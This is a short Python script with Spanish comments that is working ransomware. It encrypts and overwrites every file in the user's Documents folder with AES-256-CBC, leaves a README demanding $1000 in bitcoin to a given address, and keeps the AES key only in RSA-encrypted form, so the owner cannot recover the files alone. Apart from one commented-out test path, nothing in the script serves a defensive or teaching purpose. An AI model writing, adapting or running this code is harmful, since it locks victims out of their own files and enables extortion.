from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
import os
from Crypto.PublicKey import RSA

def generate_key():
    key = os.urandom(32)  # Genera una clave aleatoria de 32 bytes (256 bits)
    return key

def load_public_key(public_key_path='public_key.pem'):
    # Cargar la llave pública RSA desde el archivo
    with open(public_key_path, 'rb') as pub_file:
        public_key = RSA.import_key(pub_file.read())
    return public_key

def encrypt_aes_key_with_public_key(aes_key, public_key):
    # Crear un cifrador RSA usando PKCS1_OAEP
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)
    return encrypted_key

def save_encrypted_aes_key(encrypted_key, output_path='key.key.enc'):
    # Guardar la clave AES cifrada en un archivo
    with open(output_path, 'wb') as enc_file:
        enc_file.write(encrypted_key)
    print(f"Clave AES cifrada guardada en '{output_path}'.")

def encrypt(files, key):
    for file in files:
        cipher = AES.new(key, AES.MODE_CBC)  # Usar modo CBC
        iv = cipher.iv  # Obtener el IV generado

        with open(file, 'rb') as f:
            data = f.read()
        
        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))  # Cifrar y añadir padding

        with open(file, 'wb') as f:
            f.write(encrypted_data)  # Sobrescribir el archivo con datos cifrados

if __name__ == '__main__':
    # Generar clave aes-256
    aes_key = generate_key()
    # path_to_encrypt = './TestFiles'  # Cambia esto a la ruta deseada
    documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    files = os.listdir(documents_path)
    full_path = [os.path.join(documents_path, file) for file in files]

    # Encriptar archivos
    encrypt(full_path, aes_key)

    # Crear un archivo README
    with open(os.path.join(documents_path, 'README.txt'), 'w') as f:
        f.write('Your files have been encrypted')
        f.write('\nIf you want to decrypt your files you will need to pay $1000 to the following bitcoin address: 1J9yZa3XazbXbJ6vW8ZL4g5B2Zc3yv7b3A')

    public_key = load_public_key('public_key.pem')
    encrypted_aes_key = encrypt_aes_key_with_public_key(aes_key, public_key)

    # Guardar la clave AES cifrada
    save_encrypted_aes_key(encrypted_aes_key)
